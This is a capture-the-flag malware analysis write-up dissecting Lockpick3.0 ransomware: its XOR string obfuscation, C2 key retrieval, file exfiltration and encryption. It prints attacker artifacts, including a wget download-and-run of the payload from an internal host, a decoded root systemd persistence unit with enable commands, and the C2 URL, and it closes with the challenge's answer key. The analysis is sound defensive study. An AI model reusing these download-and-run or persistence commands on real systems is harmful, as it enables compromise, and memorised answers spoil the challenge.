# Lockpick3.0

## Speech
```
The threat actors of the Lockpick variant of Ransomware seem to have increased their skillset. Thankfully on this occasion they only hit a development, non production server. We require your assistance performing some reverse engineering of the payload in addition to some analysis of some relevant artifacts. Interestingly we can't find evidence of remote access so there is likely an insider threat.... Good luck! Please note on the day of release this is being utilised for a workshop, however will still be available (and free).
```

## Analysis
1. Open the ELF file in Ghidra
2. Go to the `entry` function, double click on the first argument, it's the main function
3. Modify the function signature :
![main function signature](../../img/lockpick3/00_main_signature.png)
4. In the beginning of the main we can see 7 call to a function taking a global as first argument, let's go in this function and modify it, after a little bit of reading we can see it's a function xoring the global with the first argument :
![xor function](../../img/lockpick3/01_xor_function.png)
5. Then I go back in the main function and made some formating, I changed the name of the global in order to recognize them if reused later
![main first stage](../../img/lockpick3/02_main_xor.png)
6. Then we have a line with a function taking 3 buffer as arguments, let's go in this function
    - first thing we can see the local_13c is the return value
    - then continue to lvar2 which is the return of curl_easy_init function, so we know this function is doing something with curl
    - Then a function is called with one argument, the function FUN_00102d7d :
        - This function used the function gethostname
        - if the return is different than 0 a variable is set wit the value "unknown"
        - Then the result of the xor of the third global string xored in the main is stored in a variable (len 7)
        - Then the first param is set with a string containing "passphrase :" (then the third decrypt string) and "hostname :" (with unknonw)
        - Not sure what this function does, I think it check the hostname
        ![hostname function](../../img/lockpick3/03_hostname_function.png)
    - After the hostname function we have options added to the curl instance (we know we send json or received)
    - then store the first decrypted string in a buffer and add the /connect at the end, probably an URL/domain name
    - Check if curl is inited and add some option with curl_easy_setopt function (https://curl.se/libcurl/c/curl_easy_setopt.html and the code : https://gist.github.com/jseidl/3218673)
    - The curl is done wiht curl_easy_perform and the result is stored in a variable
    - In the option we have a malloc for this option : `CURLOPT_FILE = 10001;` which mean the result has been stored in a file, after the if we see the use of `cJSON_Parse`
    - Each `cJSON_GetObjectItem` take the parsed json and a string then store the "value" for the given "key" (the string pointed to) store the value in a var and this var is then attribute to the parameters of the function
    ![curl request key and iv](../../img/lockpick3/04_request_json.png)
    - This function is making a request to the C2 in order to recover a key, an IV and a client ID probably to encrypt later
7. If the curl request successfully recover the json information a new function is launched, `FUN_00102eeb` :
    - The second decoded string is stored in a variable and used by the function `opendir`, so the second decrypted string must be a folder path (`__dirp` is a structure (an object of type dir), https://pubs.opengroup.org/onlinepubs/009695399/functions/opendir.html and the DIR structure : https://www.gnu.org/software/libc/manual/html_node/Directory-Entries.html)
    - if the opendir is successful then we use readdir (in a loop) to iterate through the file of the folder
    - the `d_name` of the file (the name of the file) is concatenated to the path then stored in a variable
    - Then a function is called and this function only call the `xstat` function (https://codebrowser.dev/glibc/glibc/sysdeps/unix/sysv/linux/xstat.c.html), this function is used for getting info about the file NAME
    - After we have two check, one checking if the file name is '.' and one to check if '..' to not encode the current and previous directory, to skip them
    - The next function is full of file extension, I think this function check the extension to do action only on these extensions
    - The function in the if (`FUN_001031eb`)
        - The function xpg_basename return the last component of a file name : https://refspecs.linuxbase.org/LSB_5.0.0/LSB-Core-generic/LSB-Core-generic/baselib---xpg-basename.html and stored in a var then opened with fopen
        - then a curl is created and options are added
        - this function ultimately send the file to the /upload endpoint
    - If the exfiltration is ok we have another function (`FUN_0010255a`)
        - https://en.cppreference.com/w/c/io/ftell
        - https://en.cppreference.com/w/cpp/io/c/fseek
        - https://github.com/openssl/openssl/issues/22628
        ![encrypt file function](../../img/lockpick3/06_encrypt_file.png)
    - We have a function iterating each file, checking the extension and if it's interesting the file is exfiltrate via curl then encrypted
    ![iterate files](../../img/lockpick3/07_iterate_files.png)

8. To continue we need to decrypt the xored data, let's find the key in the vmem file :
```bash
$ strings ubuntu-client-Snapshot2.vmem | grep ubuntu-client
./ubuntu-client xGonnaGiveIt2Ya
./ubuntu-client xGonnaGiveIt2Ya
chmod +x ubuntu-client 
./ubuntu-client xGonnaGiveIt2Ya
./ubuntu-client xGonnaGiveIt2Ya
./ubuntu-client xGonnaGiveIt2Ya
./ubuntu-client xGonnaGiveIt2Ya
wget http://10.10.0.70:8000/ubuntu-client
wget http://10.10.0.70:8123/ubuntu-client
```
9. The key is `xGonnaGiveIt2Ya`, I wrote a little script to decode the 7 encoded strings :
```python
enc_strings = [[ 0x10, 0x33, 0x1b, 0x1e, 0x1d, 0x5b, 0x68, 0x46, 0x06, 0x09, 0x28, 0x1a, 0x59, 0x2d, 0x0e, 0x16, 0x6a, 0x0e, 0x1e, 0x1e, 0x4c, 0x74, 0x18, 0x1f, 0x02, 0x38, 0x5a, 0x5d, 0x37, 0x05, 0x11, 0x20, 0x06, 0x1a, 0x0f, 0x0d, 0x28, 0x0a, 0x13, 0x04, 0x27, 0x5a, 0x53, 0x29, 0x11, 0x57 ], [ 0x57, 0x34, 0x07, 0x0f, 0x1c, 0x04, 0x68, 0x00, 0x00, 0x00, 0x00, 0x00 ], [ 0x0b, 0x22, 0x0d, 0x06, 0x5c, 0x55 ], [ 0x57, 0x32, 0x1c, 0x1c, 0x41, 0x03, 0x2e, 0x07, 0x59, 0x10, 0x2b, 0x01, 0x5c, 0x2d, 0x14, 0x55, 0x35, 0x1a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 ], [ 0x57, 0x22, 0x1b, 0x0d, 0x41, 0x12, 0x3e, 0x1a, 0x02, 0x00, 0x24, 0x10, 0x1d, 0x2a, 0x18, 0x0b, 0x33, 0x0a, 0x03, 0x41, 0x14, 0x25, 0x1c, 0x18, 0x11, 0x3c, 0x2b, 0x40, 0x2c, 0x0f, 0x16, 0x2e, 0x01, 0x09, 0x40, 0x12, 0x22, 0x1b, 0x00, 0x0c, 0x2a, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 ], [ 0x23, 0x12, 0x01, 0x07, 0x1a, 0x3c, 0x4d, 0x2d, 0x13, 0x16, 0x2a, 0x06, 0x5b, 0x29, 0x15, 0x11, 0x28, 0x01, 0x53, 0x3b, 0x03, 0x32, 0x07, 0x02, 0x10, 0x69, 0x26, 0x47, 0x37, 0x0f, 0x11, 0x29, 0x08, 0x64, 0x2f, 0x07, 0x33, 0x0c, 0x04, 0x58, 0x27, 0x11, 0x46, 0x2e, 0x0e, 0x0a, 0x2c, 0x41, 0x1a, 0x0f, 0x13, 0x20, 0x0c, 0x02, 0x6f, 0x12, 0x27, 0x57, 0x2b, 0x17, 0x11, 0x24, 0x0a, 0x33, 0x64, 0x24, 0x3f, 0x0c, 0x15, 0x36, 0x3d, 0x15, 0x40, 0x2d, 0x5c, 0x57, 0x32, 0x1c, 0x1c, 0x41, 0x03, 0x2e, 0x07, 0x59, 0x10, 0x2b, 0x01, 0x5c, 0x2d, 0x14, 0x55, 0x35, 0x1a, 0x00, 0x4e, 0x19, 0x00, 0x06, 0x18, 0x0b, 0x28, 0x33, 0x5b, 0x2f, 0x04, 0x31, 0x33, 0x5d, 0x37, 0x0f, 0x6b, 0x15, 0x0c, 0x05, 0x11, 0x28, 0x06, 0x46, 0x64, 0x00, 0x14, 0x30, 0x0e, 0x17, 0x1d, 0x6b, 0x12, 0x1a, 0x13, 0x17, 0x74, 0x06, 0x5d, 0x36, 0x15, 0x72, 0x1c, 0x26, 0x00, 0x1d, 0x15, 0x26, 0x05, 0x1a, 0x38, 0x43, 0x23, 0x53, 0x37, 0x15, 0x1d, 0x23, 0x2d, 0x17, 0x53, 0x0c, 0x32, 0x05, 0x02, 0x0c, 0x64, 0x01, 0x41, 0x3c, 0x13, 0x56, 0x33, 0x0e, 0x1c, 0x09, 0x04, 0x33, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 ], [ 0x0b, 0x3e, 0x1c, 0x1a, 0x0b, 0x0c, 0x24, 0x1d, 0x1a, 0x45, 0x2d, 0x15, 0x57, 0x34, 0x0e, 0x16, 0x6a, 0x1d, 0x0b, 0x02, 0x0e, 0x26, 0x0d, 0x56, 0x43, 0x6f, 0x54, 0x41, 0x20, 0x12, 0x0c, 0x22, 0x02, 0x0d, 0x1a, 0x0d, 0x67, 0x0c, 0x18, 0x04, 0x2b, 0x18, 0x57, 0x79, 0x14, 0x1a, 0x32, 0x01, 0x1a, 0x1b, 0x3e, 0x35, 0x1c, 0x18, 0x0b, 0x20, 0x1a, 0x55, 0x77, 0x12, 0x1d, 0x35, 0x19, 0x07, 0x0d, 0x04, 0x67, 0x4f, 0x50, 0x45, 0x3a, 0x0d, 0x41, 0x2d, 0x04, 0x15, 0x24, 0x1b, 0x02, 0x4e, 0x12, 0x33, 0x08, 0x04, 0x11, 0x69, 0x01, 0x50, 0x2c, 0x0f, 0x0c, 0x32, 0x30, 0x1c, 0x1b, 0x0f, 0x29, 0x00, 0x18, 0x02, 0x67, 0x07, 0x57, 0x2b, 0x17, 0x11, 0x24, 0x0a ]]

key = 'xGonnaGiveIt2Ya'

for i in range(len(enc_strings)):
    decoded_string = ''
    for j in range(len(enc_strings[i])):
        decoded_string += chr(enc_strings[i][j] ^ ord(key[j % len(key)]))
    print (f'Encoded string number : {i} decoded to : {decoded_string}')
```
10. We get the following result :
```bash
Encoded string number : 0 decoded to : https://plankton-app-3qigq.ondigitalocean.app/
Encoded string number : 1 decoded to : /share/iveIt
Encoded string number : 2 decoded to : sebh24
Encoded string number : 3 decoded to : /usr/bin/ubuntu-runnaGiveIt2YaxG
Encoded string number : 4 decoded to : /etc/systemd/system/ubuntu_running.service2YaxGonnaGiveIt2YaxGon
Encoded string number : 5 decoded to : [Unit]
Description=Ubuntu Running
After=network.target
[Service]
ExecStart=/usr/bin/ubuntu-run xGonnaGiveIt2Ya
Restart=always
User=root
[Install]
WantedBy=multi-user.targetiveIt2YaxGonnaGiveIt
Encoded string number : 6 decoded to : systemctl daemon-reload && systemctl enable ubuntu_running.service && systemctl start ubuntu_running.service
```

## Questions
1. Please confirm the file hash of the malware? (MD5)
    > a2444b61b65be96fc2e65924dee8febd
    - md5sum * after unzipping
2. Please confirm the XOR string utilised by the attacker for obfuscation?
    > xGonnaGiveIt2Ya
    - Found in the mmeory cf. 8
3. What is the API endpoint utilised to retrieve the key?
    > https://plankton-app-3qigq.ondigitalocean.app/connect
    - Cf. 6, first decoded string + /connect
4. What is the API endpoint utilised for upload of files?
    > https://plankton-app-3qigq.ondigitalocean.app/upload/
    - Cf. 7
5. What is the name of the service created by the malware?
    > ubuntu_running.service
    - Cf. 9/10
6. What is the technique ID utilised by the attacker for persistence?
    > T1543.002
    - just check google, it's adding a systemd service